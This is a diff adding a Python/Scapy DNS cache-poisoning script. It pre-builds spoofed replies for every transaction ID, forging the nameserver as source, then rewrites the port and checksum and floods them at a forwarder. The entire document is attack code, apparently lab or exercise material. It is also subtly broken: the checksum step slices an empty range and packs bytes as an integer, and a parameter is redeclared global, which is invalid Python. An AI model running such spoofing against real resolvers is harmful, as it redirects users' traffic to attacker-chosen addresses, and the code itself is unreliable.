@@ -1,0 +1,43 @@
+def prepare_dns_replies(port):
+    # Reference: https://blog.woefe.com/posts/faster_scapy.html
+    dns_replies = []
+    for txid in range(0, 65536):
+        dns_replies.append(
+            Ether()
+            / IP(dst=forwarder_ip, src=nameserver_ip)
+            / UDP(sport=53, dport=0)
+            / DNS(id=txid, qr=1, qdcount=1, ancount=1, aa=1,
+                    qd=DNSQR(qname=domain_name, qtype=0x0001, qclass=0x0001),
+                    an=DNSRR(rrname=domain_name, ttl=70000, rdata="255.255.255.255"))
+        )
+    raw_dns_replies = []
+    for dns_reply in dns_replies:
+        raw_dns_replies.append(bytearray(raw(dns_reply)))
+    header = struct.pack(
+        "!4s4sHH",
+        inet_pton(socket.AF_INET, dns_replies[0]["IP"].src),
+        inet_pton(socket.AF_INET, dns_replies[0]["IP"].dst),
+        socket.IPPROTO_UDP,
+        len(raw_dns_replies[0][34:]),
+    )
+    return (raw_dns_replies, header)
+
+def forge_DNS_response(raw_dns_replies, actual_port):
+    '''Updates all pre-prepared responses with proper dport.'''
+    # Reference: https://blog.woefe.com/posts/faster_scapy.html
+    global raw_dns_replies, header
+    for reply in raw_dns_replies:
+        # update actual port
+        reply[36] = (actual_port >> 8) & 0xFF
+        reply[37] = actual_port & 0xFF
+        # update checksum
+        reply[40] = 0x00
+        reply[41] = 0x00
+        calculate_check_sum = header + reply[34:0]
+        if calculate_check_sum == 0:
+            calculate_check_sum = 0xFFFF
+        check_sum = struct.pack("!H", calculate_check_sum)
+        reply[40] = check_sum[0]
+        reply[41] = check_sum[1]
+        global_socket.send(reply)
+    return True
